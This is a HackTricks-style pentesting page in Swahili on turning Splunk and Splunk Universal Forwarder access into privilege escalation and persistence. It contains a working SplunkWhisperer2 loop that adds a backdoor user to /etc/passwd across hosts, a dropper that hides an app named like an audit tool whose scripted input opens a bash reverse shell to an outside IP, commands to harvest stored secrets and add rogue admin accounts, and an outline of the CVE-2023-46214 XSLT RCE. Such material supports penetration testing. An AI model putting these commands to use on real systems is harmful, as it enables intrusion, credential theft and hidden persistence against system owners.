# Splunk LPE na Persistence

{{#include ../../banners/hacktricks-training.md}}

Ikiwa wakati wa **enumerating** mashine **internally** au **externally** unakuta **Splunk running** (kwa kawaida **8000** kwa web UI na **8089** kwa management API), credentials halali mara nyingi zinaweza kubadilishwa kuwa **code execution** kupitia app installation, scripted inputs, au management actions. Ikiwa Splunk inaendeshwa kama **root**, mara nyingi hii huwa **privilege escalation** ya papo hapo.

Ikiwa unahitaji tu generic remote attack surface, enumeration, au app-upload RCE path, angalia:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Ikiwa tayari wewe ni **root** na Splunk service haisikilizi localhost pekee, unaweza pia kuiba **Splunk password hashes**, kurejesha **encrypted secrets**, au kusukuma **malicious app** ili kudumisha persistence locally au across multiple forwarders.

## Files za Kuvutia za Ndani

Unapofika kwenye host inayoendesha Splunk au Splunk Universal Forwarder, hizi ndizo paths zinazovutia zaidi kwa kawaida:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Artifacts muhimu:

- **`$SPLUNK_HOME/etc/passwd`**: watumiaji wa ndani wa Splunk na password hashes.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: key inayotumiwa na Splunk kusimba secrets zilizohifadhiwa katika faili kadhaa za `.conf`.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: faili ya awali ya admin bootstrap; ni muhimu katika gold images na makosa ya provisioning. Hupuuzwa ikiwa `etc/passwd` tayari ipo.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: mahali ambapo scripted inputs huwezeshwa kwa kawaida.
- **`$SPLUNK_HOME/etc/deployment-apps/`** au **`$SPLUNK_HOME/etc/apps/`**: maeneo mazuri ya kuficha app yenye persistence au kukagua kile ambacho tayari kinasambazwa.

## Muhtasari wa Splunk Universal Forwarder Agent Exploit

Kwa maelezo zaidi angalia [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Huu ni muhtasari tu:<sup>[[1]](#references)</sup>

**Muhtasari wa exploit:**
Exploit inayolenga Splunk Universal Forwarder (UF) huwawezesha attackers walio na **agent password** kutekeleza arbitrary code kwenye systems zinazoendesha agent, na hivyo uwezekano wa kucompromise sehemu kubwa ya environment.

**Kwa nini inafanya kazi:**

- UF management service mara nyingi huonekana kwenye **TCP 8089**.
- Attackers wanaweza kuauthenticate kwenye API na kuagiza forwarder kusakinisha **malicious app bundle**.
- Primitive hii inaweza kutumiwa locally kwa **LPE** au remotely kwa **RCE**.
- Public tooling kama **SplunkWhisperer2** huunda app bundle automatically na inaweza kuadapt payloads kwa Linux targets.

**Njia za kawaida za kurecover password:**

- Cleartext credentials katika documentation, scripts, shares, au deployment automation.
- Password hashes ndani ya `$SPLUNK_HOME/etc/passwd` zikifuatiwa na offline cracking.
- Golden images au provisioning leftovers kama `user-seed.conf`.

**Impact:**

- SYSTEM/root-level code execution kwenye kila host iliyocompromise.
- Deployment ya persistent apps, backdoors, au ransomware.
- Kuzima au kuchezea telemetry kabla data haijaforwardiwa.

**Example command ya exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploits za umma zinazoweza kutumika:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence kupitia Scripted Inputs au Malicious Apps

Ikiwa una **filesystem write access** kama `root`/`splunk`, au authenticated access ya kusakinisha apps, persistence mechanism ya kuaminika sana ni kuweka **custom app** yenye **scripted input**.<sup>[[2]](#references)</sup> Nyaraka rasmi za Splunk zinatarajia scripted inputs ziwe ndani ya app directory na ziwezeshwe kutoka `inputs.conf`.

Muundo wa kawaida:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
`inputs.conf` ya msingi:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Dropper ya Linux ya Haraka:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Maelezo:

- Mbinu hiyo hiyo hufanya kazi kwenye **Universal Forwarder** kwa kutumia `/opt/splunkforwarder/etc/apps/`.
- Attackers mara nyingi hujichanganya kwa kurekebisha add-on halali badala ya kuunda app yenye nia mbaya iliyo wazi.
- Kwenye **deployment server**, kuweka app yenye nia mbaya ndani ya `deployment-apps/` hugeuka kuwa **fleet-wide persistence** kwa sababu forwarders huuliza mara kwa mara, hupakua apps zilizosasishwa, na mara nyingi hujiwasha upya ili kutumia mabadiliko hayo.

## Wizi wa Credentials na Kuchukua Udhibiti wa Admin

Ikiwa unaweza kusoma files za ndani za Splunk, kwa kawaida kuna malengo mawili mazuri: kurejesha **Splunk admin access** na kurejesha **encrypted service credentials**.

### Password hashes na local users

Splunk huhifadhi data ya local authentication kwenye `etc/passwd`. Kulingana na deployment, kuvunja file hilo kunaweza kurejesha credentials zinazofanya kazi za web UI na management API.

Ikiwa tayari una **admin** credentials halali na Splunk inatumia backend yake ya **native** authentication, CLI yenyewe inaweza kutumika kwa persistence:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` na values zilizosimbwa kwa njia fiche

Splunk hutumia `etc/auth/splunk.secret` kulinda values nyeti zilizohifadhiwa katika configuration files nyingi. Ikiwa unaweza kuiba **secret** na **`.conf` files** husika, mara nyingi unaweza kurejesha au kutumia tena:

- forwarder/indexer shared secrets kama `pass4SymmKey`
- TLS private-key passwords kama `sslPassword`
- LDAP bind credentials kama `bindDNPassword`

Hii ni muhimu kwa **lateral movement** hata wakati Splunk admin password yenyewe haiwezi kuvunjwa.

### Matumizi mabaya ya `user-seed.conf`

`user-seed.conf` hutumiwa tu wakati wa first start au wakati `etc/passwd` haipo. Hii huifanya isiwe na manufaa sana kwenye live box, lakini huwa ya kuvutia sana katika:

- compromised installation templates
- container images
- unattended provisioning workflows
- appliances ambapo Splunk huanzishwa upya automatically

Katika hali hizi, kuweka `HASHED_PASSWORD` iliyotengenezwa kwa `splunk hash-passwd` hukupa njia isiyoonekana ya kurejesha admin access baada ya redeployment.

## Kutumia Vibaya Splunk Queries

Kwa maelezo zaidi angalia [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>

Mbinu muhimu ya hivi karibuni ni kutumia vibaya **user-supplied XSLT** katika matoleo hatarishi ya Splunk Enterprise ili kubadilisha account iliyo authenticated yenye privileges ndogo kuwa **OS command execution** kama mtumiaji wa `splunk`.

Mtiririko wa jumla:

1. Authenticate kwenye Splunk.
2. Upload file ya **XSL** yenye malicious content kupitia preview/upload functionality.
3. Fanya Splunk irender search results kwa kutumia stylesheet hiyo iliyopakiwa kutoka kwenye directory ya **dispatch**.
4. Tumia XSLT payload kuandika file au ku-trigger execution kupitia Splunk's search pipeline (kwa mfano kwa kufikia internal functionality kama `runshellscript`).

Jambo muhimu la offensive ni kwamba njia hii ni **post-auth RCE bila kuhitaji app upload**. Kwenye Linux kwa kawaida utaishia kwenye account ya **`splunk`**, ambayo bado ina thamani kwa sababu mtumiaji huyo mara nyingi ndiye mmiliki wa application tree, anaweza kusoma secrets, na anaweza kupanda persistent apps zinazoendelea kuwepo hata shell ikipotea.

Njia ya kawaida iliyotumiwa wakati wa exploitation ni:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Ikiwa Splunk inaendeshwa ikiwa na privileges nyingi kupita kiasi, au ikiwa user `splunk` ana access ya scripts hatari, service units zinazoweza kuandikwa, au rules mbaya za `sudo`, hii inakuwa clean **LPE** chain.

## Marejeo

- [1] [Kutumia Vibaya Splunk Forwarders kwa RCE na Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [Jihadhari na TraitorWare: Kutumia Splunk kwa Persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [Uchambuzi wa CVE-2023-46214: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)

{{#include ../../banners/hacktricks-training.md}}
